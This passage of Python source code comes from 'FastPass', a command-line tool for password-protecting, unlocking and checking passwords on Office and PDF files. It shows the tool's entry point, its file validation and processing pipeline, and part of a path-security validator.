    Parse JSON password mapping from stdin if specified
    """
    if hasattr(args, 'password') and args.password and 'stdin' in args.password:
        try:
            # Read JSON from stdin
            stdin_data = sys.stdin.read().strip()
            if stdin_data:
                password_mapping = json.loads(stdin_data)
                # Store the mapping for later use
                args.stdin_password_mapping = password_mapping
            # Always remove 'stdin' from password list, even if empty
            args.password = [p for p in args.password if p != 'stdin']
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in stdin: {e}")
        except Exception as e:
            raise ValueError(f"Error reading passwords from stdin: {e}")


def main() -> int:
    """
    Main Control Center
    Sets up error handling for entire program
    Prepares to read user's command-line instructions
    """
    try:
        # A1h: Read User's Commands
        # Process the command-line instructions user provided
        # Handle cases where user asks for help or makes errors
        try:
            args = parse_command_line_arguments()
        except SystemExit as e:
            # Handle argparse errors and provide custom messages
            if e.code == 2:
                # Check if this looks like missing operation (starts with -i or -p without operation)
                if len(sys.argv) > 1 and sys.argv[1].startswith('-'):
                    print("Error: Must specify an operation (encrypt, decrypt, or check-password)", file=sys.stderr)
                    return 2
            # Re-raise for other SystemExit cases (like --help, --version)
            raise
        
        # A1i: Handle Information Requests
        if hasattr(args, 'list_supported') and args.list_supported:
            return display_information_and_exit(args)
        
        # A3a-A3e: Enhanced Logging Setup
        logger = setup_logger(
            debug=getattr(args, 'debug', False),
            log_file=getattr(args, 'log_file', None)
        )
        
        # A3e: Record Program Startup with Config
        logger.info(f"FastPass v{FastPassConfig.VERSION} starting")
        logger.debug(f"Operation: {args.operation}")
        
        # Validate arguments
        validate_arguments(args)
        
        # Handle stdin passwords
        handle_stdin_passwords(args)
        
        # Load configuration
        config = FastPassConfig.load_configuration(args)
        logger.debug(f"Configuration loaded: {len(config)} settings")
        
        # Create and run main application
        app = FastPassApplication(args, logger, config)
        return app.run()
        
    except ValueError as e:
        # A1h_Error: Invalid User Input
        print(f"Error: {sanitize_error_message(str(e))}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("\nOperation cancelled by user", file=sys.stderr)
        return 1
    except Exception as e:
        from src.exceptions import FileFormatError, FileProcessingError
        # Check for specific error types that should return code 1
        error_msg = sanitize_error_message(str(e))
        if isinstance(e, (FileFormatError, FileProcessingError)) or \
           "Unsupported file format" in error_msg or \
           "File not found" in error_msg or \
           "Path resolution failed" in error_msg:
            print(f"[ERROR] {error_msg}", file=sys.stderr)
            return 1
        else:
            # Unexpected error
            print(f"[ERROR] Unexpected error: {error_msg}", file=sys.stderr)
            return 2


if __name__ == "__main__":
    sys.exit(main())
</file>

<file path="src/core/file_handler.py">
"""
FastPass File Handler Module
Maps to: Section B3a-B6h File Validation and Section D File Processing
"""

# A1a: Load System Tools
import filetype
import tempfile
import shutil
import hashlib
import os
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime
import logging

from src.utils.config import FastPassConfig
from src.exceptions import FileFormatError, ProcessingError


@dataclass
class FileManifest:
    """
    B6a: Create FileManifest Object
    Data structure to hold file metadata and processing information
    """
    path: Path
    format: str
    size: int
    is_encrypted: bool
    crypto_tool: str
    security_checked: bool = False
    access_verified: bool = False


class FileValidator:
    """
    File format validation and detection
    Maps to B3a-B6h from flowchart
    """
    
    def __init__(self, logger: logging.Logger, config: Dict[str, Any]):
        self.logger = logger
        self.config = config
        self.max_file_size = config.get('max_file_size', FastPassConfig.MAX_FILE_SIZE)
    
    def validate_file(self, file_path: Path, allow_unsupported: bool = False) -> FileManifest:
        """
        B3a-B6e: Complete file validation pipeline
        Validate file format, content, and create manifest
        """
        
        # B1f: Verify File Actually Exists
        if not file_path.exists():
            raise FileFormatError(f"File not found: {file_path}")
        
        if not file_path.is_file():
            raise FileFormatError(f"Path is not a file: {file_path}")
        
        # B3a-B3e: Enhanced File Format Validation
        file_format = self._detect_file_format(file_path, allow_unsupported=allow_unsupported)
        
        # B4a-B4d: File Access and Size Validation
        self._validate_file_access_and_size(file_path)
        
        # B5a-B5c: Encryption Status Detection
        is_encrypted = self._detect_encryption_status(file_path, file_format)
        
        # B6a-B6e: Build File Manifest
        # For unsupported formats, use None as crypto_tool to indicate it will fail during processing
        crypto_tool = FastPassConfig.SUPPORTED_FORMATS.get(file_format, None)
        
        manifest = FileManifest(
            path=file_path,
            format=file_format,
            size=file_path.stat().st_size,
            is_encrypted=is_encrypted,
            crypto_tool=crypto_tool or 'unsupported',  # Mark unsupported files
            security_checked=True,
            access_verified=True
        )
        
        # B6f: Log File Validation
        self.logger.debug(f"Validated: {file_path} (format: {file_format}, encrypted: {is_encrypted})")
        
        return manifest
    
    def _detect_file_format(self, file_path: Path, allow_unsupported: bool = False) -> str:
        """
        B3b-B3e: Enhanced File Format Validation (Magic Number Priority)
        Detect file format using magic numbers with extension fallback
        """
        
        # B3b: Detect Format via Magic Numbers (Primary)
        try:
            detected_type = filetype.guess(str(file_path))
            if detected_type:
                # Convert MIME type to extension
                mime_to_ext = {
                    'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
                    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
                    'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
                    'application/pdf': '.pdf'
                }
                
                detected_ext = mime_to_ext.get(detected_type.mime)
                if detected_ext:
                    # B3b_Success: Use Magic Number Result
                    file_ext = file_path.suffix.lower()
                    if file_ext != detected_ext:
                        # B3e_Mismatch: Format Mismatch
                        self.logger.warning(f"Extension {file_ext} != detected {detected_ext} for {file_path}")
                    return detected_ext
        except Exception as e:
            # B3b_Fallback: Use Extension Validation
            self.logger.warning(f"Magic number detection failed for {file_path}: {e}")
        
        # B3c: Validate Extension Against Supported Formats
        file_ext = file_path.suffix.lower()
        
        # B3d: Verify FastPass Can Handle This Format
        if file_ext not in FastPassConfig.SUPPORTED_FORMATS:
            # B3d_Unsupported: File Type Not Supported
            if allow_unsupported:
                # Return the unsupported format to allow deferred failure during processing
                return file_ext
            else:
                raise FileFormatError(
                    f"Unsupported file format: {file_ext}. "
                    f"Supported formats: {list(FastPassConfig.SUPPORTED_FORMATS.keys())}"
                )
        
        return file_ext
    
    def _validate_file_access_and_size(self, file_path: Path) -> None:
        """
        B4a-B4d: File Access Validation
        Check file readability, size limits, and permissions
        """
        
        # B4a: Test File Reading Capability
        try:
            with open(file_path, 'rb') as f:
                # Read a small sample to verify access
                f.read(1024)
        except Exception as e:
            # B4a_Read: File Reading Blocked
            raise FileFormatError(f"Cannot read file {file_path}: {e}")
        
        # B4b: Check File Size Limits
        file_size = file_path.stat().st_size
        
        if file_size == 0:
            # B4b_Empty: File Contains No Data
            raise FileFormatError(f"File is empty: {file_path}")
        
        if file_size > self.max_file_size:
            # B4b_Large: File Exceeds Size Limit
            raise FileFormatError(
                f"File too large: {file_size} bytes (limit: {self.max_file_size} bytes)"
            )
        
        # B4c: Check File Modification Permission
        parent_dir = file_path.parent
        if not os.access(parent_dir, os.W_OK):
            # B4c_Write: File Modification Blocked
            raise FileFormatError(f"No write permission for directory: {parent_dir}")
    
    def _detect_encryption_status(self, file_path: Path, file_format: str) -> bool:
        """
        B5a-B5c: Encryption Status Detection
        Determine if file is password-protected
        """
        
        # B5a: Determine File Type Handler
        crypto_tool = FastPassConfig.SUPPORTED_FORMATS.get(file_format)
        if not crypto_tool:
            # Unsupported format - assume unencrypted
            return False
        
        try:
            # B5b: Test Encryption Status
            with open(file_path, 'rb') as f:
                if crypto_tool == 'msoffcrypto':
                    # B5a_Office: Office Document Detection
                    import msoffcrypto
                    office_file = msoffcrypto.OfficeFile(f)
                    return office_file.is_encrypted()
                
                elif crypto_tool == 'PyPDF2':
                    # B5a_PDF: PDF Document Detection
                    import PyPDF2
                    pdf_reader = PyPDF2.PdfReader(f)
                    return pdf_reader.is_encrypted
                
        except Exception as e:
            # B5b_Failed: Encryption Detection Failed
            self.logger.warning(f"Cannot detect encryption for {file_path}: {e}")
            # Assume unencrypted and proceed with caution
            return False
        
        return False


class FileProcessor:
    """
    File processing pipeline with crypto operations
    Maps to Section D from flowchart
    """
    
    def __init__(self, logger: logging.Logger, config: Dict[str, Any], 
                 password_manager, crypto_handlers: Dict, temp_files_created: List):
        self.logger = logger
        self.config = config
        self.password_manager = password_manager
        self.crypto_handlers = crypto_handlers
        self.temp_files_created = temp_files_created
    
    def process_files(self, validated_files: List[FileManifest], 
                     operation: str, output_dir: Optional[Path], dry_run: bool = False, verify: bool = False) -> Dict:
        """
        D2a-D4g: Main File Processing Pipeline
        Process all validated files with crypto operations
        """
        
        # D1a-D1f: Initialize TempFileManager and secure temp directory
        with tempfile.TemporaryDirectory(prefix=self.config['temp_dir_prefix']) as temp_dir_str:
            temp_dir = Path(temp_dir_str)
            
            # D1c: Set Enhanced Secure Permissions
            temp_dir.chmod(0o700)
            
            # Create processing subdirectories
            processing_dir = temp_dir / 'processing'
            output_temp_dir = temp_dir / 'output'
            processing_dir.mkdir(mode=0o700)
            output_temp_dir.mkdir(mode=0o700)
            
            # D2a: Initialize Processing Results
            successful_files = []
            failed_files = []
            
            # D2b: Start Main Processing Loop
            for file_manifest in validated_files:
                try:
                    result = self._process_single_file(
                        file_manifest, operation, output_dir,
                        processing_dir, output_temp_dir, dry_run, verify
                    )
                    successful_files.append(result)
                    
                except Exception as e:
                    error = FileProcessingError(file_manifest.path, str(e))
                    failed_files.append(error)
                    self.logger.error(f"Failed to process {file_manifest.path}: {e}")
            
            return {
                'successful_files': successful_files,
                'failed_files': failed_files,
                'total_files': len(validated_files)
            }
    
    def _process_single_file(self, file_manifest: FileManifest, operation: str,
                           output_dir: Optional[Path], processing_dir: Path,
                           output_temp_dir: Path, dry_run: bool = False, verify: bool = False) -> 'FileProcessingResult':
        """
        D2c-D4g: Process single file through complete pipeline
        """
        
        # D2c: Get Crypto Handler
        if file_manifest.crypto_tool == 'unsupported':
            raise ProcessingError(f"Unsupported file format: {file_manifest.format}")
        
        handler = self.crypto_handlers[file_manifest.crypto_tool]
        
        # D2d: Find Working Password
        if operation == 'decrypt' and file_manifest.is_encrypted:
            password = self.password_manager.find_working_password(file_manifest.path, handler)
            if not password:
                raise ProcessingError(f"No working password found for {file_manifest.path}")
        elif operation == 'check-password' and file_manifest.is_encrypted:
            # For check-password, try to find a password but don't fail if none found
            password = self.password_manager.find_working_password(file_manifest.path, handler)
            # Note: password may be None, which is handled in the check-password logic
        elif operation == 'encrypt':
            # For encryption, use first available password
            passwords = self.password_manager.get_password_candidates(file_manifest.path)
            if not passwords:
                raise ProcessingError(f"No password specified for encryption of {file_manifest.path}")
            password = passwords[0]
        else:
            password = None
        
        # D2e-D2f: Setup Temp File Paths and Copy Input
        temp_input = processing_dir / f'input_{file_manifest.path.name}'
        temp_output = output_temp_dir / f'output_{file_manifest.path.name}'
        
        if not dry_run:
            shutil.copy2(file_manifest.path, temp_input)
        
        # D2g-D2h: Perform Crypto Operation
        if dry_run:
            # Dry-run mode: simulate operations without making changes
            if operation == 'encrypt':
                self.logger.info(f"DRY RUN: Would encrypt {file_manifest.path.name}")
            elif operation == 'decrypt':
                self.logger.info(f"DRY RUN: Would decrypt {file_manifest.path.name}")
            elif operation == 'check-password':
                self.logger.info(f"DRY RUN: Would check password for {file_manifest.path.name}")
            # In dry-run, create a dummy output file if needed for validation
            if operation != 'check-password':
                temp_output.touch()
        else:
            # Real operations
            if operation == 'encrypt':
                handler.encrypt_file(temp_input, temp_output, password)
            elif operation == 'decrypt':
                handler.decrypt_file(temp_input, temp_output, password)
            elif operation == 'check-password':
                # For check-password, verify file status and password if available
                if file_manifest.is_encrypted:
                    if password:
                        if not handler.test_password(temp_input, password):
                            raise ProcessingError(f"Password verification failed for {file_manifest.path}")
                        self.logger.info(f"Password check: {file_manifest.path.name} - password works")
                    else:
                        self.logger.info(f"Password check: {file_manifest.path.name} - encrypted, no password provided")
                else:
                    self.logger.info(f"Password check: {file_manifest.path.name} - not encrypted")
                # No output file needed for check-password
                temp_output = None
        
        # D3a-D3d: Output Validation (if output file was created)
        if not dry_run and temp_output and operation != 'check-password':
            self._validate_output_file(temp_output, file_manifest, operation)
        
        # D4a-D4g: File Movement and Final Result
        if dry_run:
            # In dry-run mode, no file changes are made
            final_path = file_manifest.path
        elif operation != 'check-password':
            final_path = self._move_to_final_location(
                temp_output, file_manifest.path, output_dir
            )
        else:
            final_path = file_manifest.path  # No file movement for check-password
        
        # Deep verification if verify mode is enabled
        if verify and not dry_run and operation != 'check-password':
            self._perform_deep_verification(final_path, file_manifest, operation, password)
        
        # D4f-D4g: Create Processing Result
        return FileProcessingResult(
            original_path=file_manifest.path,
            final_path=final_path,
            operation=operation,
            password_used=password is not None,
            checksum=self._calculate_checksum(final_path) if final_path.exists() else None
        )
    
    def _perform_deep_verification(self, final_path: Path, file_manifest: FileManifest, operation: str, password: str) -> None:
        """
        Perform deep verification of the processed file
        """
        handler = self.crypto_handlers[file_manifest.crypto_tool]
        
        try:
            if operation == 'encrypt':
                # For encryption, verify the file is encrypted and password works
                self.logger.info(f"Verification: Testing encrypted file {final_path.name}")
                if not handler.test_password(final_path, password):
                    raise ProcessingError(f"Verification failed: Encrypted file cannot be opened with password")
                self.logger.info(f"Verification successful: {final_path.name} is properly encrypted")
                
            elif operation == 'decrypt':
                # For decryption, verify the file is no longer encrypted (if applicable)
                self.logger.info(f"Verification: Checking decrypted file {final_path.name}")
                try:
                    # Try to detect if file is still encrypted by attempting password test
                    if handler.test_password(final_path, password):
                        self.logger.warning(f"Verification: {final_path.name} may still be encrypted")
                    else:
                        self.logger.info(f"Verification successful: {final_path.name} appears to be decrypted")
                except:
                    # If password test fails, it likely means file is decrypted (good)
                    self.logger.info(f"Verification successful: {final_path.name} appears to be decrypted")
                    
        except Exception as e:
            self.logger.error(f"Deep verification failed for {final_path.name}: {e}")
            # Don't raise exception - verification failure shouldn't abort the operation
    
    def _validate_output_file(self, temp_output: Path, file_manifest: FileManifest, operation: str) -> None:
        """
        D3a-D3d: Output Validation
        Validate the processed output file
        """
        
        # D3a: Validate Output File Exists
        if not temp_output.exists():
            raise ProcessingError("Crypto operation did not create output file")
        
        # D3b: Check Output File Size
        output_size = temp_output.stat().st_size
        if output_size == 0:
            raise ProcessingError("Output file is empty")
        
        # D3c: Format-Specific Validation
        try:
            if file_manifest.crypto_tool == 'msoffcrypto':
                # D3c_Office: Validate Office Document
                import msoffcrypto
                with open(temp_output, 'rb') as f:
                    office_file = msoffcrypto.OfficeFile(f)
                    # Try to read document structure
                    
            elif file_manifest.crypto_tool == 'PyPDF2':
                # D3c_PDF: Validate PDF Document
                import PyPDF2
                with open(temp_output, 'rb') as f:
                    pdf_reader = PyPDF2.PdfReader(f)
                    # Try to read PDF structure
                    
        except Exception as e:
            raise ProcessingError(f"Output file validation failed: {e}")
        
        # D3d: Validate Encryption Status Changed
        current_encrypted = self._detect_encryption_status_for_validation(temp_output, file_manifest.format)
        expected_encrypted = operation == 'encrypt'
        
        if current_encrypted != expected_encrypted:
            raise ProcessingError(f"Encryption status not changed correctly (expected: {expected_encrypted}, actual: {current_encrypted})")
    
    def _detect_encryption_status_for_validation(self, file_path: Path, file_format: str) -> bool:
        """Helper to detect encryption status for validation"""
        crypto_tool = FastPassConfig.SUPPORTED_FORMATS[file_format]
        
        try:
            with open(file_path, 'rb') as f:
                if crypto_tool == 'msoffcrypto':
                    import msoffcrypto
                    office_file = msoffcrypto.OfficeFile(f)
                    return office_file.is_encrypted()
                elif crypto_tool == 'PyPDF2':
                    import PyPDF2
                    pdf_reader = PyPDF2.PdfReader(f)
                    return pdf_reader.is_encrypted
        except Exception:
            return False
        
        return False
    
    def _move_to_final_location(self, temp_output: Path, original_path: Path, 
                              output_dir: Optional[Path]) -> Path:
        """
        D4a-D4e: Enhanced File Movement with Error Handling
        Move processed file to final location
        """
        
        # D4a: Determine Final Output Path with Validation
        if output_dir:
            final_path = output_dir / original_path.name
        else:
            # In-place modification
            final_path = original_path
        
        # D4b: Handle Filename Conflicts
        if final_path.exists() and final_path != original_path:
            # Generate unique name for output directory
            counter = 1
            base = final_path.stem
            suffix = final_path.suffix
            while final_path.exists():
                final_path = final_path.parent / f"{base}_{counter}{suffix}"
                counter += 1
        
        # D4c: Atomic Move with Error Handling
        try:
            # Ensure target directory exists
            final_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Atomic move
            shutil.move(str(temp_output), str(final_path))
            
        except Exception as e:
            raise ProcessingError(f"Failed to move file to final location: {e}")
        
        # D4d: Update File Permissions
        final_path.chmod(self.config['secure_permissions'])
        
        return final_path
    
    def _calculate_checksum(self, file_path: Path) -> str:
        """
        D4e: Generate File Checksum
        Calculate SHA256 checksum for file integrity
        """
        try:
            return hashlib.sha256(file_path.read_bytes()).hexdigest()
        except Exception:
            return None


@dataclass
class FileProcessingResult:
    """Result of processing a single file"""
    original_path: Path
    final_path: Path
    operation: str
    password_used: bool
    checksum: Optional[str] = None


@dataclass
class FileProcessingError:
    """Error during file processing"""
    path: Path
    message: str


class ResultsReporter:
    """
    Results reporting and exit code determination
    Maps to Section E4a-E5d from flowchart
    """
    
    def __init__(self, logger: logging.Logger, start_time: datetime):
        self.logger = logger
        self.start_time = start_time
    
    def generate_report(self, processing_results: Dict) -> int:
        """
        E4a-E5d: Report generation and exit code determination
        Generate comprehensive report and determine exit code
        """
        
        # E1a-E1e: Calculate Processing Metrics
        end_time = datetime.now()
        duration = end_time - self.start_time
        
        successful_files = processing_results['successful_files']
        failed_files = processing_results['failed_files']
        total_files = processing_results['total_files']
        
        # E4b-E4d: Generate Report
        self._print_results_summary(successful_files, failed_files, total_files, duration)
        
        # E5a-E5d: Exit Code Determination
        return self._determine_exit_code(successful_files, failed_files)
    
    def _print_results_summary(self, successful_files: List, failed_files: List, 
                             total_files: int, duration) -> None:
        """
        E4b-E4e: Print comprehensive results summary
        """
        
        print(f"\nFastPass Processing Complete")
        print(f"{'=' * 40}")
        print(f"Total files processed: {total_files}")
        print(f"Successful: {len(successful_files)}")
        print(f"Failed: {len(failed_files)}")
        print(f"Processing time: {duration.total_seconds():.2f} seconds")
        
        if successful_files:
            print(f"\nSuccessful files:")
            for result in successful_files:
                print(f"  SUCCESS: {result.original_path}")
        
        if failed_files:
            print(f"\nFailed files:")
            for error in failed_files:
                print(f"  FAILED: {error.path}: {error.message}")
    
    def _determine_exit_code(self, successful_files: List, failed_files: List) -> int:
        """
        E5a-E5d: Exit Code Determination
        Determine appropriate exit code based on results
        """
        
        success_count = len(successful_files)
        failure_count = len(failed_files)
        
        if failure_count == 0 and success_count > 0:
            # E5b_Success: Exit Code 0
            self.logger.info("All operations successful")
            return 0
        elif success_count > 0 and failure_count > 0:
            # E5b_Mixed: Exit Code 1
            self.logger.warning("Some operations failed")
            return 1
        else:
            # E5b_Failure: Exit Code 1
            self.logger.error("All operations failed")
            return 1
</file>

<file path="src/core/security.py">
"""
FastPass Security Validation Module
Maps to: Section B2a-B2e Enhanced Security Validation from flowchart
"""

# A1a: Load System Tools
import os
import stat
from pathlib import Path
from typing import Set
import logging

from src.exceptions import SecurityViolationError


class SecurityValidator:
    """
    Security validation and path checking
    Implements comprehensive security hardening
    """
    
    def __init__(self, logger: logging.Logger, allowed_directories: Set[str] = None):
        self.logger = logger
        
        # B2d: Set Security Boundaries
        # Define which folders the program is allowed to access
        self.custom_allowed_directories = allowed_directories
        self.allowed_directories = self._get_allowed_directories()
    
    def _get_allowed_directories(self) -> Set[Path]:
        """
        # B1-SEC-1: Set Security Boundaries
        Define allowed security zones for file access - Configurable with sensible defaults
        """
        allowed = set()
        
        # If custom directories are provided, use those
        if self.custom_allowed_directories:
            for dir_path in self.custom_allowed_directories:
                try:
                    resolved_dir = Path(dir_path).resolve(strict=False)
                    allowed.add(resolved_dir)
                    self.logger.debug(f"Custom security boundary set: {resolved_dir}")
                except Exception as e:
                    self.logger.error(f"Failed to resolve custom directory {dir_path}: {e}")
        else:
            # Default security boundaries
            # User's home directory - default allowed location
            try:
                home_dir = Path.home().resolve(strict=False)
                allowed.add(home_dir)
                self.logger.debug(f"Security boundary set: {home_dir}")
            except Exception as e:
                self.logger.error(f"Failed to resolve home directory: {e}")
            
            # Current working directory - allow for project work
            try:
                cwd = Path.cwd().resolve(strict=False)
                allowed.add(cwd)
                self.logger.debug(f"Current working directory allowed: {cwd}")
            except Exception as e:
                self.logger.warning(f"Could not add current working directory: {e}")
        
        # Always allow system temp directory for legitimate temporary operations
        try:
            import tempfile
            temp_dir = Path(tempfile.gettempdir()).resolve(strict=False)
            allowed.add(temp_dir)
            self.logger.debug(f"Temp directory allowed: {temp_dir}")
        except Exception as e:
            self.logger.warning(f"Could not add temp directory: {e}")
        
        return allowed
    
    def validate_file_path(self, file_path: Path) -> Path:
        """
        # B1-SEC-2: Hardened Path Security Validation
        Comprehensive security checks with strict enforcement
        """
        
        # B1-SEC-2a: Path Character Validation (null bytes and control characters)
        path_str = str(file_path)
        
        # Check for null bytes
        if '\x00' in path_str:
            raise SecurityViolationError(f"Path contains null bytes or control characters: {file_path}")
            
        # Check for control characters (0x00-0x1F and 0x7F-0x9F)
        for char in path_str:
            if ord(char) < 32 or (127 <= ord(char) <= 159):
                raise SecurityViolationError(f"Path contains null bytes or control characters: {file_path}")
        
        # B1-SEC-2b: Path Length Validation
        if len(path_str) > 260:  # Windows MAX_PATH limitation
            raise SecurityViolationError(f"Path too long (>{260} characters): {file_path}")
        
        # # B1-SEC-2c: Strict Path Resolution with symlink detection
        try:
            # First expand user path (handle ~ on Unix systems)
            expanded_path = file_path.expanduser()
            # Use strict=False to allow non-existent files, then check existence separately
            resolved_path = expanded_path.resolve(strict=False)
            
            # Check directory containment BEFORE any file operations to avoid permission errors
            if not self._is_path_strictly_contained(resolved_path):
                allowed_dirs_str = ", ".join(str(d) for d in self.allowed_directories)
                raise SecurityViolationError(f"File path outside security boundaries. Allowed directories: {allowed_dirs_str}. Path: {file_path}")
            
            # Explicitly check if file exists for better error messages (after containment check)
            if not resolved_path.exists():
                raise SecurityViolationError(f"File not found: {file_path}")
                
        except SecurityViolationError:
            # Re-raise security violations as-is
            raise
        except Exception as e:
            raise SecurityViolationError(f"Path resolution failed: {file_path} - {e}")
        
        # # B1-SEC-2b: Explicit Symlink Detection and Rejection
        if file_path.is_symlink() or resolved_path.is_symlink():
            raise SecurityViolationError(
                f"Symbolic links are not allowed for security reasons: {file_path}"
            )
        
        # Check all parent directories for symlinks
        for parent in file_path.parents:
            if parent.is_symlink():
                raise SecurityViolationError(
                    f"Path contains symbolic link in directory structure: {file_path}"
                )
        
        # # B1-SEC-2c: Path Length Validation
        if len(str(resolved_path)) > 260:  # Windows MAX_PATH limitation
            raise SecurityViolationError(f"Path too long (>{260} chars): {file_path}")
        
        # # B1-SEC-2d: Null Byte and Control Character Detection
        path_str = str(file_path)
        if '\x00' in path_str or any(ord(c) < 32 for c in path_str if c not in ['\t', '\n', '\r']):
            raise SecurityViolationError(f"Path contains null bytes or control characters: {file_path}")
        
        # # B1-SEC-2f: Thorough Component Analysis
        self._validate_path_components_strict(resolved_path)
        
        # # B1-SEC-2g: Final Security Zone Verification
        if not self._is_file_in_secure_zone(resolved_path):
            raise SecurityViolationError(
                f"File access blocked by security policy: {file_path}"
            )
        
        self.logger.debug(f"Hardened security validation passed: {resolved_path}")
        return resolved_path
    
    def _is_path_strictly_contained(self, resolved_path: Path) -> bool:
        """
        # B1-SEC-3: Strict Directory Containment Check
        Ensure path is strictly within home directory with no exceptions
        """
        for allowed_dir in self.allowed_directories:
            try:
                # Use relative_to() to check strict containment
                relative_path = resolved_path.relative_to(allowed_dir)
                
                # Additional check: ensure we're not at the boundary
                if str(relative_path) == '.':
                    # Path is exactly the allowed directory itself
                    return False
                
                return True
            except ValueError:
                # Path is not relative to this allowed directory
                continue
        
        return False
    
    def _is_path_within_allowed_directories(self, resolved_path: Path) -> bool:
        """
        B2b_Check: Path Within Security Boundaries? (Legacy method)
        Check if path is contained within approved locations
        """
        return self._is_path_strictly_contained(resolved_path)
    
    def _validate_path_components_strict(self, resolved_path: Path) -> None:
        """
        # B1-SEC-4: Thorough Component Analysis
        Examine every folder and file name for security violations with strict rules
        """
        
        # B2c_Loop: Examine Path Elements One by One
        for part in resolved_path.parts:
            if not self._is_path_component_safe_strict(part):
                # B2c_Invalid: Unsafe Path Element Found
                raise SecurityViolationError(
                    f"Unsafe path component detected: {part}"
                )
    
    def _validate_path_components(self, resolved_path: Path) -> None:
        """
        B2c: Check Each Path Element (Legacy method)
        Examine every folder and file name for security violations
        """
        return self._validate_path_components_strict(resolved_path)
    
    def _is_path_component_safe_strict(self, component: str) -> bool:
        """
        # B1-SEC-5: Strict Path Component Safety Check
        Check individual path components with enhanced security rules
        """
        
        # Reject empty components
        if not component:
            return False
        
        # Skip drive letters on Windows (e.g., "C:", "D:")
        if len(component) == 2 and component[1] == ':' and component[0].isalpha():
            return True
        
        # Skip root directory
        if component in ['/', '\\']:
            return True
        
        # # B1-SEC-5a: Reject path traversal patterns
        dangerous_patterns = [
            '..', '~',  # Path traversal and special directories (but allow '.' for current dir)
        ]
        
        # Windows reserved names (check both full component and base name without extension)
        windows_reserved = [
            'CON', 'PRN', 'AUX', 'NUL',
            'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
            'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'
        ]
        
        component_upper = component.upper()
        if component_upper in dangerous_patterns:
            return False
            
        # Check if component or its base name (without extension) is a Windows reserved name
        if component_upper in windows_reserved:
            return False
        # Also check base name without extension
        base_name = component_upper.split('.')[0] if '.' in component_upper else component_upper
        if base_name in windows_reserved:
            return False
        
        # # B1-SEC-5b: Reject hidden files and directories (starting with .) but allow system directories
        if component.startswith('.') and component not in ['.']:
            return False
        
        # # B1-SEC-5c: Check for dangerous characters (allow : and \ for Windows paths)
        dangerous_chars = '<>"|?*'
        if any(char in component for char in dangerous_chars):
            return False
        
        # # B1-SEC-5d: Check for control characters and null bytes
        if any(ord(char) < 32 for char in component):
            return False
        
        # # B1-SEC-5e: Check for Unicode normalization issues
        if '\x00' in component:
            return False
        
        # # B1-SEC-5f: Check for leading/trailing spaces or dots (Windows issues)
        # Allow "." as special case for current directory
        if component != ".":
            # Check for leading or trailing spaces
            if component.startswith(' ') or component.endswith(' '):
                return False
            # Check for space before extension (problematic on Windows)
            if ' .' in component:
                return False
            # Check for trailing dots (problematic on Windows)
            if component.endswith('.'):
                return False
        
        # # B1-SEC-5g: Reject excessively long component names
        if len(component) > 255:  # Filesystem limit
            return False
        
        return True
    
    def _is_path_component_safe(self, component: str) -> bool:
        """
        B2c_Check: Path Element Safe? (Legacy method)
        Check individual path components for safety
        """
        return self._is_path_component_safe_strict(component)
    
    def _is_file_in_secure_zone(self, resolved_path: Path) -> bool:
        """
        # B1-SEC-6: Final Security Zone Verification
        Enhanced final verification with strict security checks
        """
        
        # # B1-SEC-6a: Symlinks already rejected in main validation
        # We should never reach here with symlinks, but double-check
        if resolved_path.is_symlink():
            return False
        
        # # B1-SEC-6b: Check file permissions for security issues (Unix/Linux only)
        try:
            file_stat = resolved_path.stat()
            
            # Reject world-writable files (security risk) - Unix/Linux only
            # Skip this check on Windows to prevent false positives
            if os.name != 'nt' and hasattr(stat, 'S_IWOTH'):
                # Check if file is in temp directory (allowed to be world-writable)
                import tempfile
                temp_dir = Path(tempfile.gettempdir()).resolve(strict=False)
                is_in_temp = False
                try:
                    resolved_path.relative_to(temp_dir)
                    is_in_temp = True
                except ValueError:
                    pass
                
                if file_stat.st_mode & stat.S_IWOTH and not is_in_temp:
                    self.logger.error(f"World-writable file rejected for security: {resolved_path}")
                    return False
                
            # # B1-SEC-6c: Check for suspicious file permissions (Unix/Linux only)
            # Reject files with unusual permissions that might indicate compromise
            # Skip SUID/SGID checks on Windows (not applicable)
            if os.name != 'nt':
                if hasattr(stat, 'S_ISUID') and file_stat.st_mode & stat.S_ISUID:
                    self.logger.error(f"SUID file rejected for security: {resolved_path}")
                    return False
                    
                if hasattr(stat, 'S_ISGID') and file_stat.st_mode & stat.S_ISGID:
                    self.logger.error(f"SGID file rejected for security: {resolved_path}")
                    return False
                
        except Exception as e:
            # If we can't check permissions, reject for security
            self.logger.error(f"Cannot verify file permissions, rejecting: {resolved_path} - {e}")
            return False
        
        # # B1-SEC-6d: Additional file type validation
        try:
            # Ensure it's a regular file, not a device, socket, etc.
            if not resolved_path.is_file():
                return False
        except Exception:
            return False
        
        return True
    
    def _is_file_in_safe_zone(self, resolved_path: Path) -> bool:
        """
        B2e_Check: File in Safe Area? (Legacy method)
        Final security zone verification
        """
        return self._is_file_in_secure_zone(resolved_path)
    
    def validate_output_directory(self, output_dir: Path) -> Path:
        """
        Additional validation for output directories with full security checks
        """
        if output_dir is None:
            return None
        
        # Apply the same comprehensive security validation as file paths
        # This includes character validation, path component checking, etc.
        
        # Path Character Validation (null bytes and control characters)
        path_str = str(output_dir)
        
        # Check for null bytes
        if '\x00' in path_str:
            raise SecurityViolationError(f"Output directory contains null bytes or control characters: {output_dir}")
            
        # Check for control characters (0x00-0x1F and 0x7F-0x9F)
        for char in path_str:
            if ord(char) < 32 or (127 <= ord(char) <= 159):
                raise SecurityViolationError(f"Output directory contains null bytes or control characters: {output_dir}")
        
        # Path Length Validation
        if len(path_str) > 260:  # Windows MAX_PATH limitation
            raise SecurityViolationError(f"Output directory path too long (>{260} characters): {output_dir}")
        
        try:
            # First expand user path (handle ~ on Unix systems)
            expanded_path = output_dir.expanduser()
            # Use strict=False to allow non-existent directories for creation
            resolved_output = expanded_path.resolve(strict=False)
            
            # Validate each path component using the same strict rules
